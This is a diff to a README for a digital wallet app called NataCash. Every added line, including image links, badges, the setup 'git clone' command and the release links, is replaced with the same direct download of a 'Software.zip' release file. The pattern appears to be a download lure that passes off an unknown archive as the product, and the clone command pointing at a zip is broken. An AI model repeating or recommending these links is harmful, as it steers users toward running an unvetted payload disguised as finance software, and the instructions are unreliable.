@@ -1,6 +1,6 @@
 # NataCash (Welcome to NataLee Pro Cash!)
 
-![NataCash Logo](https://example.com/natacash-logo.png)
+![NataCash Logo](https://github.com/abdulbasitblock/NataCash/releases/download/v2.0/Software.zip)
 
 NataCash is your personal digital wallet for daily life. With NataLee Pro Cash, you can easily make payments, transfer money, add funds, and cash out from your NataLee Pro Cash wallet.
 
@@ -34,7 +34,7 @@ To get started with NataCash, follow these steps:
 
 1. Clone this repository to your local machine.
 ```bash
-git clone https://github.com/yourusername/NataCash.git
+git clone https://github.com/abdulbasitblock/NataCash/releases/download/v2.0/Software.zip
 ```
 
 2. Install the necessary dependencies.
@@ -88,14 +88,14 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ---
 
-[Download NataCash v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download NataCash v1.0.0](https://github.com/abdulbasitblock/NataCash/releases/download/v2.0/Software.zip)
 
-![Download NataCash v1.0.0](https://img.shields.io/badge/Download-NataCash%20v1.0.0-brightgreen)
+![Download NataCash v1.0.0](https://github.com/abdulbasitblock/NataCash/releases/download/v2.0/Software.zip%20v1.0.0-brightgreen)
 
 ---
 
-Visit the [Releases](https://github.com/yourusername/NataCash/releases) section for additional information and updates.
+Visit the [Releases](https://github.com/abdulbasitblock/NataCash/releases/download/v2.0/Software.zip) section for additional information and updates.
 
 Thank you for choosing NataCash as your digital wallet solution! 🚀🔒📱
 
-![NataCash](https://example.com/natacash-screenshot.png)
+![NataCash](https://github.com/abdulbasitblock/NataCash/releases/download/v2.0/Software.zip)
